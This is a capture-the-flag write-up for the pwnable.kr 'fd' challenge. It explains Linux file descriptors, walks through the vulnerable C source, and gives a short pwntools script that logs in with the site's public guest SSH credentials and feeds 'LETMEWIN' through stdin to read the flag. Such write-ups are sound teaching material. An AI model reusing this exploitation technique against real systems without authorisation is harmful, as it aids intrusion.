# pwnable.kr

'pwnable.kr' is a wargame site which provides various pwn challenges regarding system exploitation. While playing pwnable.kr, you could learn/improve system hacking skills.

The challenges are divided into four categories.  

[Toddler's Bottle]  -  very easy challenges with simple mistakes.  
[Rookiss]  -  typical bug exploitation challenges for rookies.  
[Grotesque]  -  these challenges are grotesque-y. painful to solve it, but very tasty flag  
[Hacker's Secret]  -  intended solution for these challenges involves special techniques.  

Here are  my writeups of the challenges, starting with the easiest ones.

## Toddler's Bottle

### fd

#### The challenge description
Mommy! what is a file descriptor in Linux?  
ssh fd@pwnable.kr -p 2222   
(pw:guest)  

We are given a hint, the file descriptor and the ssh login info.

According to wikipedia, a filed descriptor is a handler used to acces a file or other input/output resource. 
A file descriptor is a non-negative integer, generally represented in the C programming language as the type int (negative values being reserved  to indicate an error condition).  
There are 3 types of file descriptors:  

| File          | Stream         | Int   |
| ------------- |:-------------:| -----:|
|standard input    |stdin    | 0
|standard output   | stdout |   1 |
|standard error| stderr |    2 |
 
#### The source analysis
After the ssh we notice 3 files: the executable file, the source code of the file, and the flag. If we try to open the flag file, we get permission denied.  
![alt text](https://github.com/Alex-Stinga/pwnable.kr/blob/master/fd/fd1.png)

The source code of fd.c is:
``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char buf[32];

int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}

	int fd = atoi( argv[1] ) - 0x1234;
	int len = 0;
	len = read(fd, buf, 32);

	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	
	printf("learn about Linux file IO\n");
	return 0;
}
```

The programs gets a number as input and substracts the 0x1234 value (4660 in dec). After googling the read function we find it's syntax ```ssize_t read(int fildes, void *buf, size_t nbytes); ```  
Fildes is a file descriptor of where to read the input. You can either use a file descriptor obtained from the open system call, using a text file we have on computer, or you can use 0, 1, or 2, to refer to standard input, standard output, or standard error, respectively.

In our case we need to pass the 0 value which is obtained subtracting the 0x1234 value with itself. After this we need to pass the string LETMEWIN

#### The exploit

```python
#!/usr/bin/python
from pwn import *

# if we connect to the host in the shell we will use the command: ssh fd@pwnable.kr -p 2222
# the parameters are username host password port

shell = ssh('fd' ,'pwnable.kr' ,password='guest', port=2222)

#we run the fd file and the input arguments are fd and 4660 
process = shell.process(executable='./fd', argv=['fd','4660'])

#send the required data
process.sendline('LETMEWIN')

#print the received bytes
print process.recv() 
```

And we got the flag.  
![alt text](https://github.com/Alex-Stinga/pwnable.kr/blob/master/fd/exploit.png)
